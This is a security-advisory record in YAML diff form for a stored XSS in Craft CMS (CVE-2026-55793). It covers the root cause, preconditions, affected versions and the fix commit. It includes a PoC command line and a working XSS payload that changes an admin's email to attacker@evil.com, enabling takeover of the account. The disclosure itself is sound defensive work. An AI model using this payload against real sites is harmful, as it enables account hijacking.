@@ -1,0 +1,321 @@
+advisory_id: GHSA-xrqc-p465-2xvg
+datasource_id: github_osv/GHSA-xrqc-p465-2xvg
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xrqc-p465-2xvg/GHSA-xrqc-p465-2xvg.json
+aliases:
+  - CVE-2026-55793
+summary: |
+  Craft CMS: Stored XSS via Structure entry title in table view
+  # Stored XSS via Structure entry title in table view
+
+  ## Summary
+
+  An Author-level control panel user can store a JavaScript payload in an entry title. When an admin, or any control panel user with `saveEntries` for the same Structure section, drags another entry under the poisoned entry in table view, the payload executes in the victim’s session.
+
+  The issue is exploitable because the title is escaped into `data-title` by the server, decoded again by the browser, read with jQuery `.data('title')`, and then concatenated into a new HTML string without attribute escaping.
+
+  Execution was verified with `alert(document.domain)`. Impact was verified against an elevated admin session by changing the admin user’s email through `users/save-user`, then using the password-reset flow to take over the account.
+
+  ## Preconditions
+
+  - Attacker has `createEntries` + `saveEntries` on a Structure-type section (Author-style CP account; no admin permission required).
+  - Victim has `saveEntries` on the same section. Craft only renders drag handles when `structureEditable` is true, which requires this permission, so any admin qualifies.
+  - Section must be type Structure. Channel and Single sections are unaffected.
+  - Poisoned entry must have no children at the time of the drag (fires on the 0-to-1 descendant transition).
+  - For the email-change account-takeover path, the victim must currently have an elevated session. The stored XSS itself does not require elevation.
+
+  ## Root cause
+
+  `ElementTableSorter.js` lines 643-652:
+
+  ```js
+  const ancestorTitle = this._updateAncestors._$ancestor.data('title');
+  $(
+    '<button … aria-label="' +
+      Craft.t('app', 'Show {title} children', {title: ancestorTitle}) +
+    '"></button>'
+  ).insertAfter(…);
+  ```
+
+  `Craft.t` with a `{title}` token calls `_parseToken`, reaches `case 'none': return arg` (`Craft.js:193-194`), and returns the title verbatim. The result is handed to jQuery's `$()` and parsed as HTML.
+
+  The server-side template correctly encodes the entry title into `data-title`, but the browser decodes that attribute before jQuery returns it from `.data('title')`. At that point the value is attacker-controlled HTML, and it is inserted into the `aria-label` attribute without `Craft.escapeHtml()`.
+
+  ## Steps to reproduce
+
+  **Plant (attacker - Author account):**
+
+  ```bash
+  python3 poc.py --url http://target --cp admin \
+    --user author@example.com --pass secret --section mySection
+  ```
+
+  **Trigger (victim - any control panel user with `saveEntries`, e.g. admin):**
+
+  1. Open the section index in Table view.
+  2. Drag the "Drag me" entry and drop it as the first child of the poisoned entry.
+
+  `alert(document.domain)` fires in the victim’s session.
+
+  **Impact payload tested in an elevated admin session (249 chars, within the 255-char title limit):**
+
+  ```html
+  "><img src=x onerror="fetch(Craft.actionUrl+'users/save-user',{method:'POST',body:Craft.csrfTokenName+'='+encodeURIComponent(Craft.csrfTokenValue)+'&userId=1&email=attacker%40evil.com',headers:{'Content-Type':'application/x-www-form-urlencoded'}})">
+  ```
+
+  When triggered during an elevated admin session, the admin’s email is changed to the attacker-controlled address. The attacker can then request a password reset and receive the reset link.
+
+  ## Impact
+
+  Stored XSS in the control panel from an Author-level account. The payload runs as the victim control panel user and can use `Craft.csrfTokenName` / `Craft.csrfTokenValue` to send same-origin action requests as that user.
+
+  In my test environment, triggering the payload in an elevated admin session allowed Author-to-admin account takeover via admin email change and password reset.
+
+  ## Mitigating factors
+
+  - Requires an existing control panel account (Author role minimum).
+  - Victim must perform a drag operation, not just visit the page.
+  - The demonstrated email-change takeover requires the victim’s session to be elevated at trigger time.
+
+  ## Resources
+
+  https://github.com/craftcms/cms/commit/162321e899cc97517fb6f5a02b5528f549d0c6cc
+impacted_packages:
+  - purl: pkg:composer/craftcms/cms
+    affected_versions: vers:composer/>=5.0.0-RC1|<=5.9.22
+    fixed_versions: vers:composer/5.9.53
+    affected_packages:
+      - pkg:composer/craftcms/cms@5.0.0-RC1
+      - pkg:composer/craftcms/cms@5.0.0-alpha.1
+      - pkg:composer/craftcms/cms@5.0.0-alpha.2
+      - pkg:composer/craftcms/cms@5.0.0-alpha.3
+      - pkg:composer/craftcms/cms@5.0.0-alpha.4
+      - pkg:composer/craftcms/cms@5.0.0-alpha.5
+      - pkg:composer/craftcms/cms@5.0.0-alpha.6
+      - pkg:composer/craftcms/cms@5.0.0-alpha.7
+      - pkg:composer/craftcms/cms@5.0.0-alpha.8
+      - pkg:composer/craftcms/cms@5.0.0-alpha.9
+      - pkg:composer/craftcms/cms@5.0.0-alpha.10
+      - pkg:composer/craftcms/cms@5.0.0-alpha.11
+      - pkg:composer/craftcms/cms@5.0.0-alpha.12
+      - pkg:composer/craftcms/cms@5.0.0-alpha.13
+      - pkg:composer/craftcms/cms@5.0.0-beta.1
+      - pkg:composer/craftcms/cms@5.0.0-beta.2
+      - pkg:composer/craftcms/cms@5.0.0-beta.3
+      - pkg:composer/craftcms/cms@5.0.0-beta.4
+      - pkg:composer/craftcms/cms@5.0.0-beta.5
+      - pkg:composer/craftcms/cms@5.0.0-beta.6
+      - pkg:composer/craftcms/cms@5.0.0-beta.7
+      - pkg:composer/craftcms/cms@5.0.0-beta.8
+      - pkg:composer/craftcms/cms@5.0.0-beta.9
+      - pkg:composer/craftcms/cms@5.0.0-beta.10
+      - pkg:composer/craftcms/cms@5.0.0-beta.11
+      - pkg:composer/craftcms/cms@5.0.0
+      - pkg:composer/craftcms/cms@5.0.1
+      - pkg:composer/craftcms/cms@5.0.2
+      - pkg:composer/craftcms/cms@5.0.3
+      - pkg:composer/craftcms/cms@5.0.4
+      - pkg:composer/craftcms/cms@5.0.5
+      - pkg:composer/craftcms/cms@5.0.6
+      - pkg:composer/craftcms/cms@5.1.0
+      - pkg:composer/craftcms/cms@5.1.1
+      - pkg:composer/craftcms/cms@5.1.2
+      - pkg:composer/craftcms/cms@5.1.3
+      - pkg:composer/craftcms/cms@5.1.4
+      - pkg:composer/craftcms/cms@5.1.5
+      - pkg:composer/craftcms/cms@5.1.6
+      - pkg:composer/craftcms/cms@5.1.7
+      - pkg:composer/craftcms/cms@5.1.8
+      - pkg:composer/craftcms/cms@5.1.9
+      - pkg:composer/craftcms/cms@5.1.10
+      - pkg:composer/craftcms/cms@5.2.0-beta.1
+      - pkg:composer/craftcms/cms@5.2.0-beta.2
+      - pkg:composer/craftcms/cms@5.2.0-beta.3
+      - pkg:composer/craftcms/cms@5.2.0-beta.4
+      - pkg:composer/craftcms/cms@5.2.0-beta.5
+      - pkg:composer/craftcms/cms@5.2.0-beta.6
+      - pkg:composer/craftcms/cms@5.2.0
+      - pkg:composer/craftcms/cms@5.2.1
+      - pkg:composer/craftcms/cms@5.2.2
+      - pkg:composer/craftcms/cms@5.2.3
+      - pkg:composer/craftcms/cms@5.2.4
+      - pkg:composer/craftcms/cms@5.2.4%2B1
+      - pkg:composer/craftcms/cms@5.2.5
+      - pkg:composer/craftcms/cms@5.2.6
+      - pkg:composer/craftcms/cms@5.2.7
+      - pkg:composer/craftcms/cms@5.2.8
+      - pkg:composer/craftcms/cms@5.2.9
+      - pkg:composer/craftcms/cms@5.2.10
+      - pkg:composer/craftcms/cms@5.3.0-beta.1
+      - pkg:composer/craftcms/cms@5.3.0-beta.2
+      - pkg:composer/craftcms/cms@5.3.0
+      - pkg:composer/craftcms/cms@5.3.0%2B1
+      - pkg:composer/craftcms/cms@5.3.0%2B2
+      - pkg:composer/craftcms/cms@5.3.0%2B3
+      - pkg:composer/craftcms/cms@5.3.1
+      - pkg:composer/craftcms/cms@5.3.2
+      - pkg:composer/craftcms/cms@5.3.3
+      - pkg:composer/craftcms/cms@5.3.4
+      - pkg:composer/craftcms/cms@5.3.5
+      - pkg:composer/craftcms/cms@5.3.6
+      - pkg:composer/craftcms/cms@5.4.0
+      - pkg:composer/craftcms/cms@5.4.0%2B1
+      - pkg:composer/craftcms/cms@5.4.1
+      - pkg:composer/craftcms/cms@5.4.2
+      - pkg:composer/craftcms/cms@5.4.3
+      - pkg:composer/craftcms/cms@5.4.4
+      - pkg:composer/craftcms/cms@5.4.5
+      - pkg:composer/craftcms/cms@5.4.5%2B1
+      - pkg:composer/craftcms/cms@5.4.6
+      - pkg:composer/craftcms/cms@5.4.7
+      - pkg:composer/craftcms/cms@5.4.7%2B1
+      - pkg:composer/craftcms/cms@5.4.8
+      - pkg:composer/craftcms/cms@5.4.9
+      - pkg:composer/craftcms/cms@5.4.10
+      - pkg:composer/craftcms/cms@5.4.10%2B1
+      - pkg:composer/craftcms/cms@5.5.0
+      - pkg:composer/craftcms/cms@5.5.0%2B1
+      - pkg:composer/craftcms/cms@5.5.1
+      - pkg:composer/craftcms/cms@5.5.1%2B1
+      - pkg:composer/craftcms/cms@5.5.2
+      - pkg:composer/craftcms/cms@5.5.3
+      - pkg:composer/craftcms/cms@5.5.4
+      - pkg:composer/craftcms/cms@5.5.5
+      - pkg:composer/craftcms/cms@5.5.6
+      - pkg:composer/craftcms/cms@5.5.6%2B1
+      - pkg:composer/craftcms/cms@5.5.7
+      - pkg:composer/craftcms/cms@5.5.8
+      - pkg:composer/craftcms/cms@5.5.9
+      - pkg:composer/craftcms/cms@5.5.10
+      - pkg:composer/craftcms/cms@5.6.0
+      - pkg:composer/craftcms/cms@5.6.0%2B1
+      - pkg:composer/craftcms/cms@5.6.0%2B2
+      - pkg:composer/craftcms/cms@5.6.1
+      - pkg:composer/craftcms/cms@5.6.2
+      - pkg:composer/craftcms/cms@5.6.3
+      - pkg:composer/craftcms/cms@5.6.4
+      - pkg:composer/craftcms/cms@5.6.5
+      - pkg:composer/craftcms/cms@5.6.5%2B1
+      - pkg:composer/craftcms/cms@5.6.6
+      - pkg:composer/craftcms/cms@5.6.7
+      - pkg:composer/craftcms/cms@5.6.8
+      - pkg:composer/craftcms/cms@5.6.9
+      - pkg:composer/craftcms/cms@5.6.9%2B1
+      - pkg:composer/craftcms/cms@5.6.10
+      - pkg:composer/craftcms/cms@5.6.10%2B1
+      - pkg:composer/craftcms/cms@5.6.10%2B2
+      - pkg:composer/craftcms/cms@5.6.11
+      - pkg:composer/craftcms/cms@5.6.12
+      - pkg:composer/craftcms/cms@5.6.13
+      - pkg:composer/craftcms/cms@5.6.14
+      - pkg:composer/craftcms/cms@5.6.15
+      - pkg:composer/craftcms/cms@5.6.16
+      - pkg:composer/craftcms/cms@5.6.17
+      - pkg:composer/craftcms/cms@5.7.0-beta.1
+      - pkg:composer/craftcms/cms@5.7.0-beta.2
+      - pkg:composer/craftcms/cms@5.7.0
+      - pkg:composer/craftcms/cms@5.7.1
+      - pkg:composer/craftcms/cms@5.7.1%2B1
+      - pkg:composer/craftcms/cms@5.7.2
+      - pkg:composer/craftcms/cms@5.7.3
+      - pkg:composer/craftcms/cms@5.7.4
+      - pkg:composer/craftcms/cms@5.7.5
+      - pkg:composer/craftcms/cms@5.7.6
+      - pkg:composer/craftcms/cms@5.7.7
+      - pkg:composer/craftcms/cms@5.7.8
+      - pkg:composer/craftcms/cms@5.7.8%2B1
+      - pkg:composer/craftcms/cms@5.7.8%2B2
+      - pkg:composer/craftcms/cms@5.7.9
+      - pkg:composer/craftcms/cms@5.7.10
+      - pkg:composer/craftcms/cms@5.7.11
+      - pkg:composer/craftcms/cms@5.8.0
+      - pkg:composer/craftcms/cms@5.8.1
+      - pkg:composer/craftcms/cms@5.8.2
+      - pkg:composer/craftcms/cms@5.8.3
+      - pkg:composer/craftcms/cms@5.8.4
+      - pkg:composer/craftcms/cms@5.8.5
+      - pkg:composer/craftcms/cms@5.8.6
+      - pkg:composer/craftcms/cms@5.8.7
+      - pkg:composer/craftcms/cms@5.8.8
+      - pkg:composer/craftcms/cms@5.8.9
+      - pkg:composer/craftcms/cms@5.8.10
+      - pkg:composer/craftcms/cms@5.8.11
+      - pkg:composer/craftcms/cms@5.8.12
+      - pkg:composer/craftcms/cms@5.8.13
+      - pkg:composer/craftcms/cms@5.8.13%2B1
+      - pkg:composer/craftcms/cms@5.8.13%2B2
+      - pkg:composer/craftcms/cms@5.8.14
+      - pkg:composer/craftcms/cms@5.8.15
+      - pkg:composer/craftcms/cms@5.8.16
+      - pkg:composer/craftcms/cms@5.8.17
+      - pkg:composer/craftcms/cms@5.8.18
+      - pkg:composer/craftcms/cms@5.8.19
+      - pkg:composer/craftcms/cms@5.8.20
+      - pkg:composer/craftcms/cms@5.8.21
+      - pkg:composer/craftcms/cms@5.8.22
+      - pkg:composer/craftcms/cms@5.8.23
+      - pkg:composer/craftcms/cms@5.9.0-beta.1
+      - pkg:composer/craftcms/cms@5.9.0-beta.2
+      - pkg:composer/craftcms/cms@5.9.0
+      - pkg:composer/craftcms/cms@5.9.1
+      - pkg:composer/craftcms/cms@5.9.2
+      - pkg:composer/craftcms/cms@5.9.3
+      - pkg:composer/craftcms/cms@5.9.4
+      - pkg:composer/craftcms/cms@5.9.5
+      - pkg:composer/craftcms/cms@5.9.6
+      - pkg:composer/craftcms/cms@5.9.7
+      - pkg:composer/craftcms/cms@5.9.8
+      - pkg:composer/craftcms/cms@5.9.9
+      - pkg:composer/craftcms/cms@5.9.10
+      - pkg:composer/craftcms/cms@5.9.11
+      - pkg:composer/craftcms/cms@5.9.12
+      - pkg:composer/craftcms/cms@5.9.13
+      - pkg:composer/craftcms/cms@5.9.14
+      - pkg:composer/craftcms/cms@5.9.15
+      - pkg:composer/craftcms/cms@5.9.16
+      - pkg:composer/craftcms/cms@5.9.17
+      - pkg:composer/craftcms/cms@5.9.18
+      - pkg:composer/craftcms/cms@5.9.19
+      - pkg:composer/craftcms/cms@5.9.20
+      - pkg:composer/craftcms/cms@5.9.21
+      - pkg:composer/craftcms/cms@5.9.22
+    fixed_packages:
+      - pkg:composer/craftcms/cms@5.9.53
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/craftcms/cms
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/craftcms/cms
+        commit: 162321e899cc97517fb6f5a02b5528f549d0c6cc
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xrqc-p465-2xvg/GHSA-xrqc-p465-2xvg.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/craftcms/cms
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-55793
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/commit/162321e899cc97517fb6f5a02b5528f549d0c6cc
+    reference_type: other
+    reference_id: 162321e899cc97517fb6f5a02b5528f549d0c6cc
+  - url: https://github.com/craftcms/cms/security/advisories/GHSA-xrqc-p465-2xvg
+    reference_type: other
+    reference_id: GHSA-xrqc-p465-2xvg
+exploits: []
